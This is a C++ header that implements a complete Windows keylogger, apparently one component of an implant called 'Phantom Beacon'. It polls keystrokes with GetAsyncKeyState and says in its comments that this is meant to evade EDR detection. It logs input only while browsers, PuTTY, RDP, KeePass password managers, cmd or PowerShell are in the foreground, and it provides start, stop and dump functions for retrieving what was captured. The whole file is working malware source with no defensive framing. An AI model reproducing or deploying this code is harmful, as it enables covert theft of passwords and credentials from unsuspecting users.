#pragma once
// ============================================================================
//  keylogger.h — Phantom Beacon Context-Aware Keylogger
//  ─────────────────────────────────────────────────────
//  Logs keystrokes only when specific target applications are in the
//  foreground. Uses GetAsyncKeyState in a background thread to avoid
//  global hooks (SetWindowsHookEx) which trigger EDRs.
// ============================================================================

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <atomic>

namespace keylogger {

// ── Target Applications ────────────────────────────────────────────────────
// Only log keystrokes if the active window belongs to one of these processes.
static const std::vector<std::string> TARGET_APPS = {
    "chrome.exe",
    "firefox.exe",
    "msedge.exe",
    "iexplore.exe",
    "putty.exe",
    "mstsc.exe",
    "keepass.exe",
    "keepassxc.exe",
    "cmd.exe",
    "powershell.exe"
};

// ── Shared State ───────────────────────────────────────────────────────────
inline std::mutex log_mutex;
inline std::string key_buffer;
inline std::atomic<bool> is_running{false};
inline std::thread kl_thread;

// ── Helper: Get Active Process Name ────────────────────────────────────────
inline std::string GetActiveProcessName() {
    HWND hForeground = GetForegroundWindow();
    if (!hForeground) return "";

    DWORD pid = 0;
    GetWindowThreadProcessId(hForeground, &pid);
    if (pid == 0) return "";

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess) return "";

    char path[MAX_PATH];
    DWORD size = MAX_PATH;
    std::string processName = "";
    
    // QueryFullProcessImageNameA requires Windows Vista+
    if (QueryFullProcessImageNameA(hProcess, 0, path, &size)) {
        std::string fullPath(path);
        size_t pos = fullPath.find_last_of("\\/");
        if (pos != std::string::npos) {
            processName = fullPath.substr(pos + 1);
        } else {
            processName = fullPath;
        }
    }
    CloseHandle(hProcess);

    // Convert to lowercase for comparison
    for (char& c : processName) {
        if (c >= 'A' && c <= 'Z') c += 32;
    }
    return processName;
}

inline bool IsTargetAppActive(std::string& activeAppOut) {
    std::string activeApp = GetActiveProcessName();
    if (activeApp.empty()) return false;

    for (const auto& target : TARGET_APPS) {
        if (activeApp == target) {
            activeAppOut = activeApp;
            return true;
        }
    }
    return false;
}

// ── Key Translation ────────────────────────────────────────────────────────
inline std::string TranslateKey(int vk, bool shift, bool caps) {
    if (vk >= 'A' && vk <= 'Z') {
        bool upper = (shift != caps);
        return upper ? std::string(1, (char)vk) : std::string(1, (char)(vk + 32));
    }
    if (vk >= '0' && vk <= '9') {
        if (!shift) return std::string(1, (char)vk);
        switch (vk) {
            case '1': return "!"; case '2': return "@"; case '3': return "#";
            case '4': return "$"; case '5': return "%"; case '6': return "^";
            case '7': return "&"; case '8': return "*"; case '9': return "(";
            case '0': return ")";
        }
    }
    switch (vk) {
        case VK_SPACE:   return " ";
        case VK_RETURN:  return "\n";
        case VK_BACK:    return "[BKSP]";
        case VK_TAB:     return "[TAB]";
        case VK_ESCAPE:  return "[ESC]";
        case VK_CONTROL: return "[CTRL]";
        case VK_MENU:    return "[ALT]";
        case VK_OEM_1:      return shift ? ":" : ";";
        case VK_OEM_PLUS:   return shift ? "+" : "=";
        case VK_OEM_COMMA:  return shift ? "<" : ",";
        case VK_OEM_MINUS:  return shift ? "_" : "-";
        case VK_OEM_PERIOD: return shift ? ">" : ".";
        case VK_OEM_2:      return shift ? "?" : "/";
        case VK_OEM_3:      return shift ? "~" : "`";
        case VK_OEM_4:      return shift ? "{" : "[";
        case VK_OEM_5:      return shift ? "|" : "\\";
        case VK_OEM_6:      return shift ? "}" : "]";
        case VK_OEM_7:      return shift ? "\"" : "'";
    }
    return "";
}

// ── Thread Loop ────────────────────────────────────────────────────────────
inline void KeyloggerLoop() {
    std::string lastApp = "";
    
    // Reset key states to prevent false positives at start
    for (int i = 0; i < 256; ++i) GetAsyncKeyState(i);

    while (is_running) {
        std::string currentApp;
        if (IsTargetAppActive(currentApp)) {
            
            // Log application context switch
            if (currentApp != lastApp) {
                std::lock_guard<std::mutex> lock(log_mutex);
                key_buffer += "\n\n[=== " + currentApp + " ===]\n";
                lastApp = currentApp;
            }

            bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
            bool caps  = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

            for (int i = 8; i <= 255; i++) {
                if (GetAsyncKeyState(i) & 1) { // LSB is set if pressed since last call
                    std::string key = TranslateKey(i, shift, caps);
                    if (!key.empty()) {
                        std::lock_guard<std::mutex> lock(log_mutex);
                        key_buffer += key;
                        
                        // Prevent infinite memory growth (cap at 1MB)
                        if (key_buffer.size() > 1024 * 1024) {
                            key_buffer = key_buffer.substr(key_buffer.size() - 512 * 1024);
                        }
                    }
                }
            }
        } else {
            lastApp = ""; // Reset context if switching to non-target
        }
        
        Sleep(10); // 10ms sleep to prevent CPU spike, responsive enough for typing
    }
}

// ── Interface ──────────────────────────────────────────────────────────────
inline std::string start() {
    if (is_running) return "Keylogger is already running.";
    is_running = true;
    kl_thread = std::thread(KeyloggerLoop);
    kl_thread.detach();
    return "Keylogger started. Monitoring target applications.";
}

inline std::string stop() {
    if (!is_running) return "Keylogger is not running.";
    is_running = false;
    return "Keylogger stopped.";
}

inline std::string dump() {
    std::lock_guard<std::mutex> lock(log_mutex);
    if (key_buffer.empty()) return "Buffer is empty.";
    
    std::string out = key_buffer;
    key_buffer.clear();
    return out;
}

} // namespace keylogger
